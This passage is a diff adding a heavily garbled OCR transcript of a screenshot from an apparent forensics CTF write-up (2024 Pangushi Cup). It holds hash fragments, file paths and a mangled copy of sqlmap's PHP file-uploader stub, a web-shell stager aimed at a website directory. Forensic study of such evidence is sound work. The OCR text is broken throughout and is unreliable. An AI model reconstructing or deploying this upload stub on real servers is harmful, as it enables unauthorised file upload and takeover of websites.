@@ -1,0 +1,24 @@
+# OCR: c5a53a68e3f272eddb6a472ac3d07675.jpg
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-晋级赛/c5a53a68e3f272eddb6a472ac3d07675.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:18
+
+tmpugkhkphpx tmpugkiv.php>
+181ceshi
+ceshi
+e18adc3949ha59abhe56e857f20f8836
+publicHome/user/imaee/3.pn
+1688185121
+263842.00
+B.Be
+6.
+D日
+4297f44b13955235245b2497399d7a93
+<?php
+/uploads/qrcode/2e2e-e9-19/16e84874121e14314374.png
+if(isset(S_REQUESTL"upload")))(Sdir-s_REQUEST["uploadDir":if(phpversion()<4.1.e')(Sfile-SHTTPPOST_FILES["file"/"name"l:@moveuploadedfile(SHTTPPOSTFILES["fileJ["tmpname"].Sdir"/ Sfile)ordie(:)else($file-sFILESfile"l"name"l:move_uploadedfile(SFILES"file"J["tmpname"l,Sdir."/".$file)ordie(:)@chnod(Sdir."/.Sfile,e755);echo
+"Fileuploaded"Jelse(echo"<form
+method-PosTenctype-multipart/form-data><inputtype-hiddenname-MaxFILESIzEvalue-1eoeeeeeee><b>sqlmapfileuploader</b><br><inputname-filetype-file><br>to
+aCtOnSERVERPHPSELF
+directory:
+<inputtypetextname-uploadDirvalue-/w/wwroot/touzilicai.com/><inputtype-submitname-uploadvalue-upload></form>:l?)
